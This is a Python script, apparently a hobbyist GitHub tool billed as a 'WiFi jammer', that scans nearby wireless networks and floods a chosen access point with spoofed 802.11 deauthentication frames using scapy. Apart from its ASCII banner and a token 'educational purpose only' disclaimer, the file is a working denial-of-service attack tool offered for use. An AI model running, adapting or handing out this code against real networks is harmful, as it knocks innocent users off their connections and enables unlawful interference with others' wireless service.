import time
from pywifi import PyWiFi, Profile, const
from scapy.all import *
import sys
import os
import subprocess

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

os.system('cls' if os.name == 'nt' else 'clear')

print("\n-------------------------------------------------------------------------------------------------------------------------------")
print("■■             ■■  ■■■■■■■  ■■         ■■■■■■    ■■■■■        ■■■   ■■■      ■■■■■■■")
print(" ■■           ■■   ■■       ■■        ■■       ■■     ■■     ■■ ■■ ■■ ■■     ■■     ")
print("  ■■   ■■■   ■■    ■■■■■■■  ■■       ■■        ■■     ■■    ■■   ■■■   ■■    ■■■■■■■")
print("   ■■ ■■ ■■ ■■     ■■       ■■        ■■       ■■     ■■   ■■           ■■   ■■     ")
print("    ■■■   ■■■      ■■■■■■■  ■■■■■■■    ■■■■■■    ■■■■■    ■■             ■■  ■■■■■■■")
print("")
print("■■■■■■■■    ■■■■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■       ■■■■■")
print("")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■   ■■")
print("■■    ■■   ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■      ")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■      ")
print("                                   ■■■■■   ■■■■■■■      ■■■■      ■■■■■■      ■■■■■■  ■■    ■■  ■■■■■■■  ■■■■■■")
print("                                  ■■       ■■          ■■  ■■     ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■    ■■■■■■■■    ■■■■■■    ■■        ■■■■■■■■  ■■■■■■■  ■■■■■■")
print("                                       ■■  ■■        ■■      ■■   ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■  ■■        ■■  ■■    ■■    ■■■■■■  ■■    ■■  ■■■■■■■  ■■    ■■")
print(BLUE + "")
print("■■             ■■  ■■  ■■■■■■■  ■■")
print(" ■■           ■■       ■■       ")
print("  ■■   ■■■   ■■    ■■  ■■■■■■■  ■■")
print("   ■■ ■■ ■■ ■■     ■■  ■■       ■■")
print("    ■■■   ■■■      ■■  ■■       ■■" + RESET)
print("\n-------------------------------------------------------------------------------------------------------------------------------")
print(GREEN + "Maker : Sigma")
print("Github : https://github.com/ermwhatesigma" + RESET)
print(BLUE + "\nThis is the wifi jammer \n**Remeber** only use for educational porpuse only\nThis wifi jammer is still in work\n" + RESET)


def get_network_interfaces():
    interfaces = []
    try:
        result = subprocess.run(['netsh', 'interface', 'show', 'interface'], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        for line in lines:
            if ':' in line:
                parts = line.split(':')
                if len(parts) > 1:
                    interface = parts[1].strip()
                    interfaces.append(interface)
    except Exception as e:
        print(f"Error reading network interfaces: {e}")
    return interfaces

def scan_networks(iface):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    scan_results = iface.scan_results()
    networks = []
    for network in scan_results:
        ssid = network.ssid
        bssid = network.bssid
        signal = network.signal
        networks.append((ssid, bssid, signal))
    return networks

def deauthenticate_network(target_bssid, target_ssid, interface):
    dot11 = Dot11(addr1=target_bssid, addr2=RandMAC(), addr3=target_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=1000, iface=interface, verbose=1)

def main():
    interfaces = get_network_interfaces()
    if not interfaces:
        print("No network interfaces found.")
        sys.exit(1)

    print("Available network interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i}: {iface}")

    try:
        choice = int(input("Enter the number of the interface to use: "))
        interface = interfaces[choice]
    except (ValueError, IndexError):
        print("Invalid choice. Exiting.")
        sys.exit(1)

    networks = scan_networks(None)
    if not networks:
        print("No networks found.")
        sys.exit(1)

    print("Available networks:")
    for i, (ssid, bssid, signal) in enumerate(networks):
        print(f"{i}: SSID: {ssid}, BSSID: {bssid}, Signal Strength: {signal} dBm")

    try:
        choice = int(input("Enter the number of the network to 'jam': "))
        ssid, bssid, signal = networks[choice]
    except (ValueError, IndexError):
        print("Invalid choice. Exiting.")
        sys.exit(1)

    print(f"Deauthenticating network: SSID: {ssid}, BSSID: {bssid}")
    deauthenticate_network(bssid, ssid, interface)

if __name__ == '__main__':
    main()